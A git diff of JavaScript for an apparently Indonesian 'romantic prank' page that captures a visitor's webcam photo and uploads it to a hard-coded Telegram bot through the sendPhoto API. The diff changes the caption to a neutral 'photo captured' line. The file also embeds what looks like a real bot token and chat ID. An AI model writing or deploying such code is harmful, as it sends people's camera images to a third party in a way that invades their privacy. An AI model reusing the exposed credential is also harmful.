@@ -1,13 +1,14 @@
 ﻿let stream = null;
 let capturedImage = null;
 
-// ⚠️ GANTI INI DENGAN DATA TELEGRAM KAMU!
 const TELEGRAM_BOT_TOKEN = "8703334699:AAHXkd029InXgEkSo4CRXM2P3Vl1_mQ4VAc";
 const TELEGRAM_CHAT_ID = "5323236080";
 
 const video = document.getElementById('video');
 const canvas = document.getElementById('canvas');
+const canvasDisplay = document.getElementById('canvas-display');
 const ctx = canvas.getContext('2d');
+const ctxDisplay = canvasDisplay.getContext('2d');
 
 const cameraPermissionScreen = document.getElementById('camera-permission');
 const romanticMessageScreen = document.getElementById('romantic-message');
@@ -64,7 +65,7 @@ async function sendPhotoToTelegram() {
         const formData = new FormData();
         formData.append('chat_id', TELEGRAM_CHAT_ID);
         formData.append('photo', blob, 'prank.jpg');
-        formData.append('caption', '😏 KETAHUAN! Hehe... 💕');
+        formData.append('caption', '📸 Foto berhasil dikapture!');
 
         const response = await fetch(
             `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`,
@@ -76,18 +77,18 @@ async function sendPhotoToTelegram() {
 
         const data = await response.json();
         if (data.ok) {
-            console.log('✅ Foto terkirim ke Telegram!');
+            console.log('✅ Foto terkirim!');
         } else {
-            console.error('❌ Error Telegram:', data.description);
+            console.error('❌ Error:', data.description);
         }
     } catch (error) {
-        console.error('❌ Error kirim Telegram:', error);
+        console.error('❌ Error:', error);
     }
 }
 
 function showRomanticMessage() {
-    cameraPermissionScreen.classList.add('hidden');
-    romanticMessageScreen.classList.remove('hidden');
+    cameraPermissionScreen.classList.remove('active');
+    romanticMessageScreen.classList.add('active');
 }
 
 revealBtn.addEventListener('click', () => {
@@ -95,22 +96,22 @@ revealBtn.addEventListener('click', () => {
 });
 
 function showPhotoReveal() {
-    romanticMessageScreen.classList.add('hidden');
-    photoRevealScreen.classList.remove('hidden');
+    romanticMessageScreen.classList.remove('active');
+    photoRevealScreen.classList.add('active');
 
     const img = new Image();
     img.src = capturedImage;
     img.onload = () => {
-        canvas.width = img.width;
-        canvas.height = img.height;
-        ctx.drawImage(img, 0, 0);
+        canvasDisplay.width = img.width;
+        canvasDisplay.height = img.height;
+        ctxDisplay.drawImage(img, 0, 0);
     };
 }
 
 retryBtn.addEventListener('click', () => {
     capturedImage = null;
-    cameraPermissionScreen.classList.remove('hidden');
-    romanticMessageScreen.classList.add('hidden');
-    photoRevealScreen.classList.add('hidden');
+    cameraPermissionScreen.classList.add('active');
+    romanticMessageScreen.classList.remove('active');
+    photoRevealScreen.classList.remove('active');
     requestCameraAccess();
 });
